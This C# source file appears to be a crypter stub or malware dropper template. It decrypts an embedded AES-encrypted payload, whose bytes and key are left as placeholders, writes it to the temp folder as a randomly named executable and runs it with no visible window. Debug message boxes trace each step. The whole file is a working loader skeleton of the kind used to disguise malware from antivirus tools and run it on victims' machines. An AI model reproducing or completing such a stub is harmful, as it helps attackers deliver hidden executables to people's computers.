using System;
using System.IO;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Windows.Forms;

class Program
{
    static byte[] encryptedData = new byte[] { __ENCRYPTED_DATA__ };
    static byte[] key = new byte[] { __AES_KEY__ };
    static byte[] iv = new byte[] { __AES_IV__ };

    static void Main()
    {
        try
        {
            MessageBox.Show("1. Starting decryption...");

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                
                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msOutput = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msOutput);
                            byte[] decryptedBytes = msOutput.ToArray();
                            
                            MessageBox.Show("2. Decryption successful. Payload size: " + decryptedBytes.Length + " bytes");

                            string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                            File.WriteAllBytes(tempPath, decryptedBytes);

                            MessageBox.Show("3. Payload written to: " + tempPath);

                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = tempPath;
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;
                            
                            Process.Start(psi);
                            
                            MessageBox.Show("4. Payload executed successfully.");
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show("Error: " + ex.Message);
        }
    }
}